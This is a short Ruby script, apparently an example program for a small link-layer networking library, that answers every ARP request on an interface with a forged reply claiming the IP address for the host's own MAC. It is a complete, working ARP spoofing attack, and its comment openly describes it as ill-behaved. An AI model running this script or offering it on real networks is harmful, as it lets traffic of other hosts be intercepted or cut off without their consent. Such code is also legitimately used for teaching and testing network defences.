#!/usr/bin/env ruby

require_relative '../vlink.rb'

# Be an ill-behaved network citizen and claim ownership of all IP addresses
# using ARP.
link = VLink.new(ARGV.first || 'eth0')
loop do
  pkt = link.parse(link.recv)           # grab and parse each packet

  # For every ARP request...
  if pkt[:protocol] == :arp and pkt[:operation] == :request
    reply = link.reverse(pkt)           # base our reply off the request
    reply[:sender_mac] = link.src_mac   # claim that IP belongs to our MAC
    reply[:operation] = :reply          # indicate to ARP that this is a reply
    link.unparse(reply)                 # send the packet
  end
end
    
